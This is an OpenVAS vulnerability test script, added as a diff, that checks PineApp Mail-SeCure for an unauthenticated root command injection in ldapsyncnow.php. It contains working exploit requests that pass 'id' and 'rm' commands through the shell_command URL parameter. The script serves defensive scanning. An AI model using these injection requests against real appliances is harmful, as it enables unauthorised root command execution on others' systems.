@@ -1,0 +1,139 @@
+###############################################################################
+# OpenVAS Vulnerability Test
+# $Id: gb_pineapp_mailsecure_61474.nasl 11 2013-10-27 10:12:02Z jan $
+#
+# PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability
+#
+# Authors:
+# Michael Meyer <michael.meyer@greenbone.net>
+#
+# Copyright:
+# Copyright (c) 2013 Greenbone Networks GmbH
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License
+# as published by the Free Software Foundation; either version 2
+# of the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+
+include("revisions-lib.inc");
+tag_impact = "Successful exploits will result in the execution of arbitrary commands
+with root privileges in the context of the affected appliance.
+Impact Level: Application";
+
+SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103758";
+
+tag_insight = "The specific flaw exists with input sanitization in the
+ldapsyncnow.php component. This flaw allows for the injection of arbitrary
+commands to the Mail-SeCure server. An attacker could leverage this
+vulnerability to execute arbitrary code as root.";
+
+
+tag_summary = "PineApp Mail-SeCure is prone to a remote command-injection
+vulnerability.";
+
+tag_solution = "Ask the Vendor for an update.";
+tag_vuldetect = "Send a crafted HTTP GET request and check the response.";
+
+if (description)
+{
+ script_oid(SCRIPT_OID);
+ script_bugtraq_id(61474);
+ script_version ("$Revision: 11 $");
+ script_tag(name:"cvss_base", value:"10.0");
+ script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+
+ script_name("PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability");
+
+ desc = "
+Summary:
+" + tag_summary + "
+
+Vulnerability Detection:
+" + tag_vuldetect + "
+
+Vulnerability Insight:
+" + tag_insight + "
+
+Impact:
+" + tag_impact + "
+
+Solution:
+" + tag_solution;
+
+ script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61474");
+ 
+ script_tag(name:"risk_factor", value:"Critical");
+ script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
+ script_tag(name:"creation_date", value:"2013-08-13 11:34:56 +0200 (Tue, 13 Aug 2013)");
+ script_description(desc);
+ script_summary("Determine if it is possible to execute the 'id' command");
+ script_category(ACT_ATTACK);
+ script_family("Web application abuses");
+ script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+ script_dependencies("find_service.nasl", "http_version.nasl");
+ script_require_ports(7443);
+ script_exclude_keys("Settings/disable_cgi_scanning","PineApp/missing");
+
+ if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
+    script_tag(name : "impact" , value : tag_impact);
+    script_tag(name : "vuldetect" , value : tag_vuldetect);
+    script_tag(name : "insight" , value : tag_insight);
+    script_tag(name : "solution" , value : tag_solution);
+    script_tag(name : "summary" , value : tag_summary);
+  }
+
+ exit(0);
+}
+
+include("http_func.inc");
+include("misc_func.inc");
+include("openvas-https.inc");
+
+port = 7443;
+if(!get_port_state(port))exit(0);
+
+host = get_host_name();
+
+req = 'GET / HTTP/1.1\r\nHost: ' + host + '\r\n\r\n';
+
+resp = https_req_get(port:port, request:req);
+
+if("PineApp" >!< resp) {
+  set_kb_item(name:"PineApp/missing", value:TRUE); 
+  exit(0);
+}  
+
+file = 'openvas_' + rand() + '.txt';
+
+req = 'GET /admin/ldapsyncnow.php?sync_now=1&shell_command=id>./' + file + '; HTTP/1.1\r\n' +
+      'Host: ' + host + '\r\n\r\n';
+
+resp = https_req_get(port:port, request:req);
+
+req = 'GET /admin/' + file + ' HTTP/1.1\r\n' +
+      'Host: ' + host + '\r\n\r\n';
+
+resp = https_req_get(port:port, request:req);
+
+req = 'GET /admin/ldapsyncnow.php?sync_now=1&shell_command=rm%20./' + file + '; HTTP/1.1\r\n' +
+      'Host: ' + host + '\r\n\r\n';
+
+https_req_get(port:port, request:req); # delete the created file      
+
+if(resp =~ "uid=[0-9]+.*gid=[0-9]+.*") {
+  security_hole(port:port);
+  exit(0);
+
+}
+
+exit(0);
